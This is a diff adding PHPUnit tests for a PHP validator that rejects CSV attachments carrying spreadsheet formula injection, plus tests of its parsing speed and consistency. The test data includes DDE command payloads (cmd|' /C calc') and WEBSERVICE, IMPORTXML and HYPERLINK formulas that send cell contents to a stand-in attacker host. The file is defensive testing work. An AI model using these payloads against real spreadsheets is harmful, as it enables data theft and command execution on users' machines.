@@ -348,4 +348,287 @@ final class PanelAttachmentsTest extends TestCase
         $out = PanelAttachments::validate([self::att('a.png', 'image/png', self::PNG), self::att('A.png', 'image/png', self::PNG)], new PanelLimits());
         $this->assertNotSame(strtolower($out[0]['filename']), strtolower($out[1]['filename']));
     }
+
+    /**
+     * CORE-DS-33 reopened by CORE-API-1 / CORE-DATA-1 (red team 2026-11-21) and closed: every cell of a CSV, in every reading a spreadsheet may make of it, is refused when it
+     * starts with = + - @ tab or a line break unless the whole cell is a plain number. The first group are the exact payloads of both proofs of concept
+     * (core-api/poc_csv_formula_bypass.php, core-data/poc_core_data_1_csv_formula.php), all of which the previous check accepted except the controls.
+     *
+     * @return array<string,array{string,bool}> bytes, whether the file is refused
+     */
+    public static function csvFormulaCells(): array
+    {
+        $long = str_repeat('1+', 50);
+
+        return [
+            // core-api/poc_csv_formula_bypass.php
+            'core-api a: =1+1 on a later line (control)' => ["name,qty\nx,1\n=1+1\n", true],
+            'core-api b: minus DDE with the pipe after 80 characters' => ["name,qty\nx,-1+" . $long . "cmd|' /C calc'!A0\n", true],
+            'core-api c: quoted plus DDE with the pipe after 80 characters' => ["name,qty\nx,\"+1+" . $long . "cmd|' /C calc'!A0\"\n", true],
+            'core-api d: minus arithmetic' => ["name,qty\nx,-2+3\n", true],
+            'core-api e: at DDE with the pipe after 80 characters' => ["name,qty\nx,@" . $long . "cmd|' /C calc'!A0\n", true],
+            'core-api f: formula after a NEL line break' => ["name,qty\nx,y\n\xc2\x85=1+1\n", true],
+            // core-data/poc_core_data_1_csv_formula.php
+            'core-data control: =1+1 second line' => ["name,qty\nwidget,=1+1\n", true],
+            'core-data control: +cmd| within 80' => ["name,qty\nwidget,+cmd|' /C calc'!A0\n", true],
+            'core-data control: +HYPERLINK(' => ["name,qty\nwidget,+HYPERLINK(\"http://x\",\"y\")\n", true],
+            'core-data bypass: +1+HYPERLINK(' => ["name,qty\nwidget,+1+HYPERLINK(\"http://attacker.invalid/?\"&A1,\"click\")\n", true],
+            'core-data bypass: -1+WEBSERVICE(' => ["name,qty\nwidget,-1+WEBSERVICE(\"http://attacker.invalid/\"&A1)\n", true],
+            'core-data bypass: @1+IMPORTXML(' => ["name,qty\nwidget,@1+IMPORTXML(\"http://attacker.invalid/\"&A1,\"//a\")\n", true],
+            'core-data bypass: DDE with the pipe after 80 characters' => ["name,qty\nwidget,+" . str_repeat('1+', 45) . "cmd|' /C calc'!A0\n", true],
+            // the readings disagree about a quote: each one must pass on its own
+            'comma reader sees a cell the semicolon quote hides' => ["a;\"b,=1+1,c\"\n", true],
+            'tab reader sees a cell the comma quote hides' => ["a,\"b\t=1+1\"\n", true],
+            'semicolon reader sees a line of a multi-line cell as a row' => ["id,note\n1,\"first line\n=1+1;x\"\n", true],
+            'a reader with every separator sees a cell the others do not' => ["x,\"a;\"b;=1+1\"\n", true],
+            'sep= names a separator no default reading uses' => ["sep=|\na|=1+1\n", true],
+            'sep= names a multi-byte separator' => ["sep=\u{00A7}\na\u{00A7}b\n", true],
+            'quoted cell never closed' => ["a,\"b\n=1+1\n", true],
+            // where the formula character hides
+            'text after the closing quote is part of the cell' => ["a,\"-5\"+1\n", true],
+            'space then a quote then the formula' => ["a, \"=1+1\"\n", true],
+            'no-break space before the formula' => ["a,\u{00A0}=1+1\n", true],
+            'zero width space before the formula' => ["a,\u{200B}+1+1\n", true],
+            'escaped quote then the formula' => ["a,\"\"\"=1+1\"\"\"\n", true],
+            'quoted cell that starts with a tab' => ["a,\"\t=1+1\"\n", true],
+            'quoted cell that starts with a carriage return' => ["a,\"\r=1+1\"\n", true],
+            'formula after a lone carriage return' => ["a,b\r=1+1\r", true],
+            'formula in the first cell' => ["=1+1,b\n", true],
+            'formula in the first cell after a bom' => ["\xEF\xBB\xBF-1+1,b\n", true],
+            // refused on purpose although not an attack (docs/panel/PANEL_API.md)
+            'dash item cell' => ["task,note\n1,- item\n", true],
+            'double dash note cell' => ["task,note\n1,-- note\n", true],
+            'phone number with a plus, brackets and dashes' => ["who,phone\nbob,+1 (555) 123-4567\n", true],
+            'handle with an at sign' => ["who,handle\nbob,@bob\n", true],
+            'signed first cell of a comma row' => ["-5,apples\n", true],
+            'cell that starts with a tab in the comma reading' => ["a,\tb\n", true],
+            // legitimate files that must stay accepted
+            'negative and positive numbers' => ["name,delta\nbob,-5\nann,+3\ncid,-12.5\n", false],
+            'exponents' => ["name,value\nx,1e5\ny,-1.5e-3\nz,+2E10\n", false],
+            'decimal comma in a semicolon file' => ["name;delta\nbob;+1,5\nann;-1,5\n", false],
+            'quoted thousands separators' => ["name,amount\nbob,\"-1,234.56\"\nann,\"+1.234,56\"\n", false],
+            'percent' => ["name,change\nbob,-5%\nann,+3.5 %\n", false],
+            'phone number of digits and spaces only (inert)' => ["who,phone\nbob,+44 20 7946 0958\n", false],
+            'a file that is one plain negative number per line' => ["-5\n+3\n-12.5\n", false],
+            'a lone dash as a placeholder' => ["name,value,note\nbob,-,x\nann,--,y\n", false],
+            'quoted commas' => ["name,note\nx,\"Smith, Bob\"\ny,\"a, -b, +c\"\n", false],
+            'multi-line quoted cell' => ["id,note\n1,\"line one\nline two\r\nline three\"\n", false],
+            'multi-line quoted first cell with a dash item' => ["\"line one\n- item two\n- item three\",1\n", false],
+            'quoted cell that contains an escaped formula in the middle' => ["a,\"said \"\"=1+1\"\" loudly\"\n", false],
+            'equals and pipe inside a cell' => ["a,b\nx=1,y|z\n", false],
+            'tab separated with numbers' => ["a\tb\n1\t-5\n", false],
+            'crlf line ends and empty cells' => ["a,b,c\r\n,,\r\n1,,-2\r\n", false],
+            'dates and times' => ["when,what\n2026-11-21,ok\n2026-11-21T10:00:00-05:00,ok\n", false],
+            'non-ascii first letters' => ["name,city\n\u{00C9}mile,Z\u{00FC}rich\n\u{5317}\u{4EAC},x\n", false],
+            'sep= line naming the comma' => ["sep=,\na,-5\n", false],
+        ];
+    }
+
+    #[DataProvider('csvFormulaCells')]
+    public function testEveryCsvCellIsCheckedForAFormulaQuoteAwareInEveryReading(string $bytes, bool $refused): void
+    {
+        $threw = false;
+        try {
+            PanelAttachments::validate([self::att('report.csv', 'text/csv', $bytes)], new PanelLimits());
+        } catch (ApiError $e) {
+            $threw = true;
+            $this->assertSame([422, 'attachment_rejected'], [$e->http, $e->errCode]);
+        }
+        $this->assertSame($refused, $threw, ($refused ? 'should be refused: ' : 'should be accepted: ') . json_encode($bytes));
+    }
+
+    /**
+     * The CSV reading is linear: adversarial files of the largest default size (5 MiB) are decided in bounded time, both the shapes the regex tokenizer consumes in bulk
+     * (signed numbers, quoted cells, separators, runs of quotes, non-ASCII text) and the shapes that need PHP one cell at a time, which the step budget refuses. The bound is
+     * generous for a CI runner, as in the markup scan test above (measured: under half a second each on a workstation).
+     *
+     * @return array<string,array{string,bool}>
+     */
+    public static function adversarialCsv(): array
+    {
+        $size = 5 * 1024 * 1024 - 64;
+        $fill = static fn (string $unit): string => "a,b\n" . str_repeat($unit, intdiv($size, strlen($unit)));
+
+        return [
+            'signed numbers' => [$fill("x,-5,+3\n"), false],
+            'quoted empty cells' => [$fill('"",'), false],
+            'quoted cells with escaped quotes' => [$fill('"a""b",'), false],
+            'quoted cells with separators inside' => [$fill('"a,b;c",'), false],
+            'quoted numbers with group separators' => [$fill("x,\"-1,234.56\"\n"), false],
+            'separators only' => [$fill(',;'), false],
+            'tab separated empty cells' => [$fill("x\t\t"), false],
+            'spaces only' => [$fill(' '), false],
+            'one long quoted cell' => ['"' . str_repeat('a""', intdiv($size, 3)) . '"', false],
+            'one long run of quotes' => ['x,"' . str_repeat('""', intdiv($size, 2) - 4) . '"', false],
+            'lone dashes' => [$fill("x,-\n"), false],
+            'tab-only cells in the semicolon reading' => [$fill(";\t"), false],
+            'cjk text' => [$fill("\u{5317}\u{4EAC},"), false],
+            'typographic quotes' => [$fill("\u{201C}a\u{201D},"), false],
+            'formula at the very end' => [$fill("x,-5\n") . "\n=1+1", true],
+            'never closed quote at the very end' => [$fill('x,"a",') . '"never closed', true],
+            // every cell needs PHP: the step budget refuses the file
+            'quoted cells that start with an escaped quote' => [$fill('"""a""",'), true],
+            'cells that start with a no-break space' => [$fill("\xC2\xA0a,"), true],
+            'quoted cells with more quote pairs than the tokenizer takes' => [$fill('"a""b""c""d""e""f""g""h""i""j",'), true],
+        ];
+    }
+
+    #[DataProvider('adversarialCsv')]
+    public function testTheCsvReadingIsLinear(string $bytes, bool $refused): void
+    {
+        $t = hrtime(true);
+        $threw = false;
+        try {
+            PanelAttachments::validate([self::att('big.csv', 'text/csv', $bytes)], new PanelLimits());
+        } catch (ApiError) {
+            $threw = true;
+        }
+        $ms = (hrtime(true) - $t) / 1e6;
+        $this->assertSame($refused, $threw);
+        $this->assertLessThan(20000, $ms, 'took ' . round($ms) . ' ms for ' . strlen($bytes) . ' bytes');
+    }
+
+    /** The CSV step budget: cells that need PHP are counted across the readings; running out refuses the file (a small budget is injected to reach the branch). */
+    public function testRunningOutOfTheCsvBudgetRefusesTheFile(): void
+    {
+        $reading = new \ReflectionMethod(PanelAttachments::class, 'csvReadingOk');
+        $csv = str_repeat("\xC2\xA0a,", 10) . "\n";   // ten cells that the tokenizer leaves to PHP
+        $budget = 100;
+        $this->assertTrue($reading->invokeArgs(null, [$csv, ',', &$budget]), 'a budget that is enough');
+        $this->assertSame(90, $budget, 'the ten cells were looked at in PHP (the empty cell after the final line break is the tokenizer\'s)');
+        $budget = 5;
+        $this->assertFalse($reading->invokeArgs(null, [$csv, ',', &$budget]), 'with a budget of five cells the reading gives up and refuses');
+        $budget = 100;
+        $this->assertTrue($reading->invokeArgs(null, [str_repeat('a,', 1000) . "\n", ',', &$budget]));
+        $this->assertSame(100, $budget, 'cells the tokenizer consumes cost nothing');
+        $budget = 100;
+        $this->assertTrue($reading->invokeArgs(null, ['a,b', ',', &$budget]));
+        $this->assertSame(99, $budget, 'a last cell with no line break after it is looked at in PHP');
+    }
+
+    /**
+     * The fast reading (a regex tokenizer that consumes runs of plainly fine cells, PHP for the rest) must decide exactly as a plain reader that walks every byte and checks
+     * every cell would. Random files over an alphabet of the characters that matter, and row-shaped files of mostly fine cells (so the batching and the quote-pair bound are
+     * crossed), are compared with such a reader. Seeded, so a failure is reproducible.
+     */
+    public function testTheFastCsvReadingAgreesWithAPlainReader(): void
+    {
+        $csvOk = new \ReflectionMethod(PanelAttachments::class, 'csvOk');
+        $inert = (string) (new \ReflectionClassConstant(PanelAttachments::class, 'CSV_INERT_CELL'))->getValue();
+        $spaces = [' ', "\u{00A0}", "\u{1680}", "\u{180E}", "\u{202F}", "\u{205F}", "\u{2060}", "\u{3000}", "\u{FEFF}"];
+        for ($cp = 0x2000; $cp <= 0x200D; ++$cp) {
+            $spaces[] = mb_chr($cp, 'UTF-8');
+        }
+        $cellOk = static function (string $v) use ($inert, $spaces): bool {
+            $p = 0;
+            $skip = static function () use (&$p, $v, $spaces): void {
+                do {
+                    $moved = false;
+                    foreach ($spaces as $sp) {
+                        if (substr($v, $p, strlen($sp)) === $sp) {
+                            $p += strlen($sp);
+                            $moved = true;
+                        }
+                    }
+                } while ($moved);
+            };
+            $skip();
+            if (($v[$p] ?? '') === '"') {
+                ++$p;
+            }
+            $skip();
+            $c = $v[$p] ?? '';
+
+            return $c === '' || !str_contains("=+-@\t\r\n", $c) || preg_match($inert, $v) === 1;
+        };
+        $readingOk = static function (string $b, string $separators) use ($cellOk): bool {
+            $stop = $separators . "\r\n";
+            $n = strlen($b);
+            $i = 0;
+            while (true) {
+                $value = '';
+                $j = $i;
+                if ($i < $n && $b[$i] === '"') {
+                    for ($j = $i + 1; true; ++$j) {
+                        if ($j >= $n) {
+                            return false;
+                        }
+                        if ($b[$j] === '"') {
+                            if (($b[$j + 1] ?? '') !== '"') {
+                                break;
+                            }
+                            ++$j;
+                        }
+                        $value .= $b[$j];
+                    }
+                    ++$j;
+                }
+                for (; $j < $n && !str_contains($stop, $b[$j]); ++$j) {
+                    $value .= $b[$j];
+                }
+                if (!$cellOk($value)) {
+                    return false;
+                }
+                if ($j >= $n) {
+                    return true;
+                }
+                $i = $j + 1;
+            }
+        };
+        $plain = static function (string $b) use ($readingOk): bool {
+            $b = str_starts_with($b, "\xEF\xBB\xBF") ? substr($b, 3) : $b;
+            $b = str_replace(["\u{0085}", "\u{2028}", "\u{2029}"], "\n", $b);
+            $readings = [',', ';', "\t", ",;\t"];
+            if (preg_match('/^"?sep=([^\r\n])/i', $b, $m) === 1) {
+                if (!str_contains(",;\t!#$&()*/:<>?[\\]^_`{|}~", $m[1])) {
+                    return false;
+                }
+                $readings[] = $m[1];
+            }
+            foreach ($readings as $separators) {
+                if (!$readingOk($b, $separators)) {
+                    return false;
+                }
+            }
+
+            return true;
+        };
+        mt_srand(20261121);
+        $alphabet = ['a', '1', '5', '.', ',', ',', ';', "\t", '"', '"', '""', ' ', '-', '+', '=', '@', "\r", "\n", "\r\n", 'e', '%', "'", "\u{00A0}", "\u{00E9}",
+            "\u{201C}", "\u{2028}", "\u{0085}", '|', 'sep=', '-5', "\u{200B}", "\u{FEFF}"];
+        $first = ['a', '"a"', '""', '"a,b"', '"a""b"', '""""', "\u{00E9}", "\"x\ny\"", '" a"', '"a""b""c""d""e""f""g""h""i""j"', "\u{5317}", 'x y'];
+        $later = array_merge($first, ['-5', '+1.5', '"-1,234"', '-', '--', '+3', '1e5', '-5%', '', ' -2 ', '"+1,5"', 'a=1', 'b|c']);
+        $cases = [];
+        for ($k = 0; $k < 3000; ++$k) {
+            $b = '';
+            for ($t = mt_rand(1, 24); $t > 0; --$t) {
+                $b .= $alphabet[mt_rand(0, count($alphabet) - 1)];
+            }
+            $cases[] = $b;
+        }
+        for ($k = 0; $k < 150; ++$k) {
+            $b = '';
+            for ($r = mt_rand(1, 12); $r > 0; --$r) {
+                $cells = [$first[mt_rand(0, count($first) - 1)]];
+                for ($c = mt_rand(0, 70); $c > 0; --$c) {
+                    $cells[] = $later[mt_rand(0, count($later) - 1)];
+                }
+                $b .= implode(',', $cells) . (mt_rand(0, 1) === 1 ? "\n" : "\r\n");
+            }
+            if (mt_rand(0, 3) === 0) {
+                $at = mt_rand(0, strlen($b));
+                $b = substr($b, 0, $at) . ['=1', '-a', '"', "\t", '@x', ';-1+1', "\u{00A0}="][mt_rand(0, 6)] . substr($b, $at);
+            }
+            $cases[] = $b;
+        }
+        $accepted = 0;
+        foreach ($cases as $b) {
+            $fast = $csvOk->invoke(null, $b);
+            $this->assertSame($plain($b), $fast, 'the fast and the plain reading disagree on ' . json_encode($b));
+            $accepted += $fast ? 1 : 0;
+        }
+        // both verdicts occur often enough for the comparison to mean something
+        $this->assertGreaterThan(300, $accepted);
+        $this->assertGreaterThan(300, count($cases) - $accepted);
+    }
 }
